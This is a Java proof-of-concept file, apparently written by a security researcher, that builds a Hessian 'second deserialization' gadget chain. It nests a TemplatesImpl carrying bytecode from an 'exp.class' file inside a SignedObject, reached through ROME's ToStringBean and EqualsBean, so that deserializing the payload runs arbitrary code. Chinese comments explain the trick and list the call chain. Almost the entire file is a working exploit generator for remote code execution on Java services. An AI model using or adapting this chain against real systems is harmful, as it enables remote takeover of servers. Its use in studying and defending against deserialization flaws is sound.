import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import util.Util;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.*;
import java.util.HashMap;

import static util.Util.makeMap;
import static util.Util.setValue;

/**
 * @Description
 * @Author dragonkeep
 * @Date 2025/1/13
 */
/*
* Hessian 二次反序列化，利用SignedObject的content来避免TemplatesImpl中的字段_tfactory修饰为transient的问题，
* 并且在SignedObject中的getObject会把content反序列化出来
 * */
/*
* 调用链子：
 HashMap.readObject()
 *   ObjectBean.hashCode()
 *       EqualsBean.beanHashCode()
 *           ToStringBean.toString()
 *              SignedObject.getObject()
 *                  BadAttributeValueExpException.readObject()
 *                      ToStringBean.toString()
 *                          TemplatesImpl.getOutputProperties()
 *

 */
public class Hessian2_SignedObject {
    public static void main(String[] args) throws Exception{

        TemplatesImpl templates=new TemplatesImpl();
        Class templatesClass=templates.getClass();
        Field namefield=templatesClass.getDeclaredField("_name");
        namefield.setAccessible(true);
        namefield.set(templates,"dragonkeep");
        Field bytecodefield=templatesClass.getDeclaredField("_bytecodes");
        bytecodefield.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("exp.class"));
        byte[][] codes={code};
        bytecodefield.set(templates,codes);
        Field tfactoryField=templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

        ToStringBean toStringBean = new ToStringBean(Templates.class,templates);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("dragonkeep");
        Field field=BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException,toStringBean);

        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        SignedObject signedObject = new SignedObject(badAttributeValueExpException,privateKey,signingEngine);

        ToStringBean toStringBean1 = new ToStringBean(SignedObject.class, signedObject);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean1);
        HashMap hashMap = makeMap(equalsBean, equalsBean);
        Util.serializeHessian(hashMap);
        Util.unserializeHessian();
    }

}
